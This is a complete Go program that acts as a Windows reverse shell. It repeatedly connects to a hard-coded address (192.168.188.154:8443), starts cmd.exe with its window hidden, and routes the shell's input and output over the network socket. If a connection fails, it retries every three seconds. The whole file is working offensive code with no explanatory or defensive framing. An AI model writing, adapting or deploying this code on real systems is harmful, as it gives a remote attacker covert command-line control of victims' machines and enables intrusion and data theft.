package main

import (
	"bufio"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

func revShell(host string) {

	for {
		// Create a tcp socket connection
		conn, err := net.Dial("tcp", host)
		if err != nil {
			time.Sleep(3000 * time.Millisecond)
			continue
		}

		// Create a cmd.exe process and redirect stdin, stdout and stderr to the socket
		proc := "cmd.exe"
		cmd := exec.Command(proc)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		cmd.Stdin, cmd.Stdout, cmd.Stderr = conn, conn, conn
		cmd.Run()

		// Checking if command exit is being sent
		reader := bufio.NewReader(conn)
		input, err := reader.ReadString('\n')
		if err != nil {
			conn.Close()
			continue
		}
		input = strings.TrimSuffix(input, "\n")
		if input == "exit" {
			conn.Close()
			os.Exit(0)
		}
	}
}

func main() {
	host := "192.168.188.154"
	port := "8443"

	revShell(host + ":" + port)
}
